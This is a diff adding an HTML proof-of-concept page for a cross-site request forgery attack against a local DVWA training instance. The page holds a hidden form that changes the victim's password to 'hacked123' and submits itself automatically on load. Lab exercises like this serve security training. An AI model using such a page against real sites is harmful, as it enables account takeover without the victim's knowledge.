@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Proof of Concept</title>
+</head>
+<body>
+    <h1>CSRF Attack PoC</h1>
+
+    <form action="http://localhost/DVWA/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="hacked123">
+        <input type="hidden" name="password_conf" value="hacked123">
+        <input type="hidden" name="Change" value="Change">
+        <input type="submit" value="Click Here">
+    </form>
+
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
